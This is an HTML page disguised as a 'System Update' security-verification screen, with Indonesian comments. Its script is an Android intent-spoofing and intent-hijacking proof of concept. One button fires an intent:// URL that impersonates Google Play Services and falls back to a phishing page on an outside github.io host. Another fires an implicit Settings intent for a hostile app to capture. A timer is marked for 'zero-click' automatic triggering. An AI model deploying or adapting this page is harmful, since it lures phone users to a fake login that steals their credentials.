<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; flex-direction: column;
  }
  .panel {
    background: #fff; padding: 40px; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
    max-width: 450px; width: 100%;
  }
  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
  p { color: #666; margin-bottom: 20px; font-size: 14px; }
  button {
    background: #007aff; color: #fff; padding: 15px;
    border-radius: 8px; font-size: 16px; font-weight: bold;
    cursor: pointer; border: none; width: 100%; margin-bottom: 10px;
  }
  button:hover { background: #005bb5; }
  #log {
    margin-top: 20px; background: #000; color: #0f0;
    padding: 10px; font-family: monospace; font-size: 12px;
    border-radius: 6px; width: 100%; max-width: 450px;
    height: 150px; overflow-y: auto; text-align: left;
  }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Verification</h1>
  <p>Pilih metode verifikasi di bawah ini:</p>
  
  <button id="btnSpoof">1. Spoof Intent (Fake Login)</button>
  <button id="btnHijack">2. Hijack Intent (Settings)</button>
</div>

<div id="log">Sistem siap...</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. INTENT SPOOFING (FAKE LOGIN)
  // ============================================
  // Menyamar sebagai aplikasi otentikasi (misal: Google Sign-In)
  // Kita mencoba memaksa browser membuka Activity palsu atau 
  // memunculkan UI yang terlihat seperti login resmi.
  
  document.getElementById('btnSpoof').onclick = function() {
    log("[!] Mencoba Intent Spoofing (Fake Login)...");

    // Trik: Menggunakan skema 'intent' dengan package Google
    // dan komponen spesifik (jika diketahui).
    
    // Format 1: Intent ke Package Google dengan Fallback jahat
    var spoofIntent = "intent://login/#Intent;" +
                      "scheme=https;" +
                      "package=com.google.android.gms;" + // Package asli Google Play Services
                      "S.browser_fallback_url=" + encodeURIComponent("https://artha231.github.io/phishing.html") + ";" + // URL Fallback (Phishing)
                      "end";

    try {
      window.location.href = spoofIntent;
      log("[+] Spoof Intent (Google GMS) dieksekusi.");
    } catch(e) {
      log("[-] Gagal: " + e.message);
    }
  };

  // ============================================
  // 2. INTENT HIJACKING (SETTINGS)
  // ============================================
  // Memanfaatkan Implicit Intent ke Settings.
  // Jika ada aplikasi jahat yang mendaftarkan Action yang sama,
  // user akan disajikan pilihan (atau langsung dibuka jika default).
  
  document.getElementById('btnHijack').onclick = function() {
    log("[!] Mencoba Intent Hijacking (Settings)...");

    // Format Intent Implicit (Tanpa Package)
    // Ini memicu Android untuk mencari semua aplikasi yang bisa menangani Action ini.
    var hijackIntent = "intent://settings/#Intent;" +
                       "action=android.settings.SETTINGS;" +
                       "end";

    try {
      window.location.href = hijackIntent;
      log("[+] Hijack Intent (Implicit Settings) dieksekusi.");
    } catch(e) {
      log("[-] Gagal: " + e.message);
    }
  };

  // ============================================
  // 3. ZERO-CLICK INTENT
  // ============================================
  setTimeout(function() {
    log("[Zero-Click] Memicu Intent otomatis...");
    // Coba trigger salah satu intent di sini jika ingin zero-click
    // document.getElementById('btnSpoof').click();
  }, 2000);

})();
</script>
</body>
</html>
